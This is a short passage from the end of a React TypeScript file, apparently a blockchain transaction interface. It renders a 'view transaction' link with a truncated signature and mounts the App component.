              <Clipboard size={16} />
              查看交易 {signature.slice(0, 8)}...{signature.slice(-8)}
            </a>
          )}
        </section>
      </section>
    </main>
  );
}

ReactDOM.createRoot(document.getElementById('root')!).render(<App />);
